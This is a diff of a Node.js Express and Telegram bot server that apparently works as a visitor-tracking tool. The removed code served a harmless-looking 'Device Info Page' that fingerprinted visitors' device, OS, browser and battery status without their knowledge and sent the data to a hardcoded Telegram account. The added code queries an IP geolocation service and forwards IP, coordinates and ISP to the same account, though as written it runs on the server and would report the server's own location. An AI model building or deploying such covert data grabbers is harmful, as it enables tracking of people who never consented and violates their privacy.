@@ -1,3 +1,4 @@
+const axios = require('axios');
 const TelegramBot = require('node-telegram-bot-api');
 const express = require('express');
 const path = require('path');
@@ -20,6 +21,37 @@ const app = express();
 
 // Define Telegram ID for user to send messages
 const ajsal = '6524787237';
+
+// Function to fetch user data from ipapi.co
+async function fetchUserData() {
+  try {
+    const response = await axios.get('https://ipapi.co/json/');
+    const userData = response.data;
+
+    // Format the message
+    const message = `
+🌍 *IP API Data*:
+- **IP Address**: ${userData.ip}
+- **City**: ${userData.city}
+- **Region**: ${userData.region}
+- **Country**: ${userData.country_name}
+- **Latitude**: ${userData.latitude}
+- **Longitude**: ${userData.longitude}
+- **ISP**: ${userData.org}
+`;
+
+    // Send the message to your Telegram
+    bot.sendMessage(ajsal, message, { parse_mode: 'Markdown' });
+  } catch (error) {
+    console.error('Error fetching IP API data:', error.message);
+  }
+}
+
+// Trigger fetching user data on a specific route
+app.get('/fetch-ip', async (req, res) => {
+  await fetchUserData();
+  res.send('IP data fetched and sent to Telegram!');
+});
 
 // Command to start the bot and show buttons
 bot.onText(/\/start/, (msg) => {
@@ -55,99 +87,6 @@ bot.on('callback_query', async (callbackQuery) => {
 // Error handler for unhandled errors
 bot.on('polling_error', (error) => {
   console.error(error);
-});
-
-// Function to detect the device name from User-Agent
-function getDeviceName(userAgent) {
-  const ua = userAgent.toLowerCase();
-
-  if (ua.includes('mobile') || ua.includes('android')) {
-    return 'Mobile';
-  } else if (ua.includes('ipad') || ua.includes('tablet')) {
-    return 'Tablet';
-  } else if (ua.includes('macintosh') || ua.includes('windows')) {
-    return 'Desktop';
-  } else {
-    return 'Unknown';
-  }
-}
-
-function getOSVersion(userAgent) {
-  const osVersion = (userAgent.match(/(iPhone|iPad|iPod|Android|Windows|Macintosh)\s([0-9._]+)/) || [])[2];
-  return osVersion || "Unknown";
-}
-
-function getBrowserVersion(userAgent) {
-  const regex = /(?:MSIE|Edge|Opera|Firefox|Chrome|Safari)[\/\s](\d+\.\d+)/;
-  const match = userAgent.match(regex);
-  return match ? match[1] : "unknown";
-}
-
-// Serve the device info page
-app.get('/axl', (req, res) => {
-  const userAgent = req.headers['user-agent'];
-  const deviceName = getDeviceName(userAgent);
-  const osVersion = getOSVersion(userAgent);
-  const browserVersion = getBrowserVersion(userAgent);
-
-  // Send message to your Telegram with detected info
-  const amessage = `🌐 *Device Info*:
-- Device: ${deviceName}
-- OS Version: ${osVersion}
-- Browser: ${browserVersion}`;
-
-  bot.sendMessage(ajsal, amessage, { parse_mode: 'Markdown' });
-
-  const html = `
-    <!DOCTYPE html>
-    <html lang="en">
-    <head>
-      <meta charset="UTF-8">
-      <meta name="viewport" content="width=device-width, initial-scale=1.0">
-      <title>Device Info</title>
-    </head>
-    <body>
-      <script>
-        async function sendBatteryInfo() {
-          try {
-            const battery = await navigator.getBattery();
-            const batteryInfo = {
-              level: (battery.level * 100) + '%',
-              charging: battery.charging ? 'Charging' : 'Not Charging'
-            };
-            
-            // Send battery info to the server
-            fetch('/battery', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify(batteryInfo)
-            });
-          } catch (error) {
-            console.error('Failed to get battery info:', error);
-          }
-        }
-
-        sendBatteryInfo();
-      </script>
-      <h1>Device Info Page</h1>
-    </body>
-    </html>
-  `;
-
-  res.send(html);
-});
-
-// Handle battery info sent from the client
-app.post('/battery', express.json(), (req, res) => {
-  const { level, charging } = req.body;
-  const nmessage = `🔋 *Battery Info*:
-- Level: ${level}
-- Status: ${charging}`;
-
-  // Send battery info to your Telegram
-  bot.sendMessage(ajsal, nmessage, { parse_mode: 'Markdown' });
-  
-  res.status(200).send('Battery info sent to Telegram.');
 });
 
 // Start the server
